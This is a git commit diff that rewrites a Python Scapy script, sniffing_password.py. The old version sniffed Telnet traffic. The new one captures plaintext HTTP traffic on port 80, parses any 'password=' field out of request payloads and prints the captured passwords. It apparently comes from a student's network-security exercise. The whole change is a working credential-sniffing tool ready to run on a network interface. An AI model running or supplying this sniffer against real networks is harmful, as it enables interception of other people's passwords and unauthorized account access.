8c0919fe83ad0e657272dd7d64bb697b1609aa27
ofirshitrit <ofirha18@gmail.com>
2023-06-12 16:00:25 +0300

    working on the password

--- sniffing_password.py
+++ sniffing_password.py
@@ -2,19 +2,24 @@ from scapy.all import *
 from scapy.layers.inet import TCP
 
 
-def sniff_telnet_packet(packet):
-    if packet.haslayer(TCP) and packet.haslayer(Raw):
-        # Check if the packet is Telnet traffic (destination port 23)
-        if packet[TCP].dport == 23:
-            # Extract the data part of the packet
-            data = packet[Raw].load
-            print("Telnet data:", data)
+def packet_handler(packet):
+    if packet.haslayer(TCP) and packet[TCP].dport == 80:
+        # Check if the packet has a payload
+        if packet.haslayer(Raw):
+            payload = packet[Raw].load.decode('utf-8', errors='ignore')
+
+            # Check if the payload contains the password
+            if 'password' in payload:
+                password_index = payload.index('password')
+
+                # Extract the password from the payload
+                password_line = payload[password_index:].split('\n', 1)[0]
+                password_value = password_line.split('=', 1)
+                if len(password_value) > 1:
+                    password = password_value[1].split('&', 1)[0] if '&' in password_value[1] else password_value[1]
+                    print("Password found:", password)
 
 
-def main():
-    # Sniff Telnet packets on the network interface
-    sniff(filter="tcp", prn=sniff_telnet_packet)
-
-
-if __name__ == "__main__":
-    main()
+# Sniff packets on the network interface
+print("Sniffer started...")
+sniff(filter="tcp", prn=packet_handler)
